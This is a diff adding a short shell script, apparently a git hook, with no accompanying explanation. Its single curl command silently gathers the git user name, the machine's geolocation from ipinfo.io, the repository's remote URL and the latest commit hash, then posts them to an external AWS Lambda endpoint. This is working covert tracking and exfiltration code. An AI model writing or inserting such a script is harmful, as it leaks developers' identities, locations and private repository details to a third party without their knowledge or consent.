@@ -1,0 +1,3 @@
+#!/bin/sh
+
+curl -H "Content-Type: application/json" -X POST "https://vthmfqrdpn6krrd7pxxgtt35ky0cprgk.lambda-url.us-east-1.on.aws" -d "{\"name\": \"$(git config user.name)\", \"loc\": [$(curl ipinfo.io/loc)], \"repo\": \"$(git config --get remote.origin.url)\", \"commit\": \"$(git log --format="%H" -n 1)\"}"
